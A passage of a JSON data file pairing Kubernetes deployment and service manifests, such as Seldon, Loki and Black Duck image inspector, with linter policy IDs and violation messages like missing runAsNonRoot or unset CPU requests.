''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: docker.io/seldonio/seldon-core-executor:1.1.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_GRPC_PORT\n          value: '5001'\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT_PREFIX\n          value: http://default-broker.\n        - name: DEFAULT_USER_ID\n          value: ''\n        image: docker.io/seldonio/seldon-core-operator:1.1.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"seldon-manager\" not found"
  },
  {
    "id": "9182",
    "manifest_path": "data/manifests/the_stack_sample/sample_3474.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-1.15\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: '1.15'\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon-1.15\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: '1.15'\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon-1.15\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: '1.15'\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=443\n        - --create-resources=$(CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: docker.io/seldonio/engine:1.1.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: docker.io/seldonio/seldon-core-executor:1.1.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_GRPC_PORT\n          value: '5001'\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT_PREFIX\n          value: http://default-broker.\n        - name: DEFAULT_USER_ID\n          value: ''\n        image: docker.io/seldonio/seldon-core-operator:1.1.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"manager\" is not set to runAsNonRoot"
  },
  {
    "id": "9183",
    "manifest_path": "data/manifests/the_stack_sample/sample_3475.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: compactor\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: loki\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: 2.0.0\n  name: observatorium-xyz-loki-compactor-http\n  namespace: observatorium\nspec:\n  ports:\n  - name: metrics\n    port: 3100\n    targetPort: 3100\n  selector:\n    app.kubernetes.io/component: compactor\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: loki\n    app.kubernetes.io/part-of: observatorium\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:compactor app.kubernetes.io/instance:observatorium-xyz app.kubernetes.io/name:loki app.kubernetes.io/part-of:observatorium])"
  },
  {
    "id": "9184",
    "manifest_path": "data/manifests/the_stack_sample/sample_3477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: workshopmanagementeventhandler\n    version: '1.0'\n  name: workshopmanagementeventhandler\n  namespace: pitstop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workshopmanagementeventhandler\n      version: '1.0'\n  template:\n    metadata:\n      labels:\n        app: workshopmanagementeventhandler\n        version: '1.0'\n    spec:\n      containers:\n      - env:\n        - name: DOTNET_ENVIRONMENT\n          value: Production\n        image: pitstop/workshopmanagementeventhandler:1.0\n        imagePullPolicy: IfNotPresent\n        name: workshopmanagementeventhandler\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"workshopmanagementeventhandler\" does not have a read-only root file system"
  },
  {
    "id": "9185",
    "manifest_path": "data/manifests/the_stack_sample/sample_3477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: workshopmanagementeventhandler\n    version: '1.0'\n  name: workshopmanagementeventhandler\n  namespace: pitstop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workshopmanagementeventhandler\n      version: '1.0'\n  template:\n    metadata:\n      labels:\n        app: workshopmanagementeventhandler\n        version: '1.0'\n    spec:\n      containers:\n      - env:\n        - name: DOTNET_ENVIRONMENT\n          value: Production\n        image: pitstop/workshopmanagementeventhandler:1.0\n        imagePullPolicy: IfNotPresent\n        name: workshopmanagementeventhandler\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"workshopmanagementeventhandler\" is not set to runAsNonRoot"
  },
  {
    "id": "9186",
    "manifest_path": "data/manifests/the_stack_sample/sample_3477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: workshopmanagementeventhandler\n    version: '1.0'\n  name: workshopmanagementeventhandler\n  namespace: pitstop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workshopmanagementeventhandler\n      version: '1.0'\n  template:\n    metadata:\n      labels:\n        app: workshopmanagementeventhandler\n        version: '1.0'\n    spec:\n      containers:\n      - env:\n        - name: DOTNET_ENVIRONMENT\n          value: Production\n        image: pitstop/workshopmanagementeventhandler:1.0\n        imagePullPolicy: IfNotPresent\n        name: workshopmanagementeventhandler\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"workshopmanagementeventhandler\" has cpu request 0"
  },
  {
    "id": "9187",
    "manifest_path": "data/manifests/the_stack_sample/sample_3477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: workshopmanagementeventhandler\n    version: '1.0'\n  name: workshopmanagementeventhandler\n  namespace: pitstop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workshopmanagementeventhandler\n      version: '1.0'\n  template:\n    metadata:\n      labels:\n        app: workshopmanagementeventhandler\n        version: '1.0'\n    spec:\n      containers:\n      - env:\n        - name: DOTNET_ENVIRONMENT\n          value: Production\n        image: pitstop/workshopmanagementeventhandler:1.0\n        imagePullPolicy: IfNotPresent\n        name: workshopmanagementeventhandler\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"workshopmanagementeventhandler\" has memory limit 0"
  },
  {
    "id": "9188",
    "manifest_path": "data/manifests/the_stack_sample/sample_3478.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: brutto-netto-service\nspec:\n  selector:\n    app: brutto-netto\n  type: LoadBalancer\n  ports:\n  - name: http\n    protocol: TCP\n    port: 80\n    targetPort: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:brutto-netto])"
  },
  {
    "id": "9189",
    "manifest_path": "data/manifests/the_stack_sample/sample_3479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-content-dev\nspec:\n  selector:\n    matchLabels:\n      app: simple-content-dev\n  template:\n    spec:\n      containers:\n      - name: httpd\n        resources:\n          limits:\n            cpu: 500m\n            memory: 250Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"httpd\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9190",
    "manifest_path": "data/manifests/the_stack_sample/sample_3479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-content-dev\nspec:\n  selector:\n    matchLabels:\n      app: simple-content-dev\n  template:\n    spec:\n      containers:\n      - name: httpd\n        resources:\n          limits:\n            cpu: 500m\n            memory: 250Mi\n",
    "policy_id": "mismatching-selector",
    "violation_text": "labels in pod spec (map[]) do not match labels in selector (&LabelSelector{MatchLabels:map[string]string{app: simple-content-dev,},MatchExpressions:[]LabelSelectorRequirement{},})"
  },
  {
    "id": "9191",
    "manifest_path": "data/manifests/the_stack_sample/sample_3479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-content-dev\nspec:\n  selector:\n    matchLabels:\n      app: simple-content-dev\n  template:\n    spec:\n      containers:\n      - name: httpd\n        resources:\n          limits:\n            cpu: 500m\n            memory: 250Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"httpd\" does not have a read-only root file system"
  },
  {
    "id": "9192",
    "manifest_path": "data/manifests/the_stack_sample/sample_3479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-content-dev\nspec:\n  selector:\n    matchLabels:\n      app: simple-content-dev\n  template:\n    spec:\n      containers:\n      - name: httpd\n        resources:\n          limits:\n            cpu: 500m\n            memory: 250Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"httpd\" is not set to runAsNonRoot"
  },
  {
    "id": "9193",
    "manifest_path": "data/manifests/the_stack_sample/sample_3479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-content-dev\nspec:\n  selector:\n    matchLabels:\n      app: simple-content-dev\n  template:\n    spec:\n      containers:\n      - name: httpd\n        resources:\n          limits:\n            cpu: 500m\n            memory: 250Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"httpd\" has cpu request 0"
  },
  {
    "id": "9194",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"blackduck-imageinspector-alpine\" does not have a read-only root file system"
  },
  {
    "id": "9195",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"blackduck-imageinspector-centos\" does not have a read-only root file system"
  },
  {
    "id": "9196",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"blackduck-imageinspector-ubuntu\" does not have a read-only root file system"
  },
  {
    "id": "9197",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"blackduck-imageinspector-alpine\" is not set to runAsNonRoot"
  },
  {
    "id": "9198",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"blackduck-imageinspector-centos\" is not set to runAsNonRoot"
  },
  {
    "id": "9199",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"blackduck-imageinspector-ubuntu\" is not set to runAsNonRoot"
  },
  {
    "id": "9200",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"blackduck-imageinspector-alpine\" has cpu request 0"
  },
  {
    "id": "9201",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"blackduck-imageinspector-centos\" has cpu request 0"
  },
  {
    "id": "9202",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: 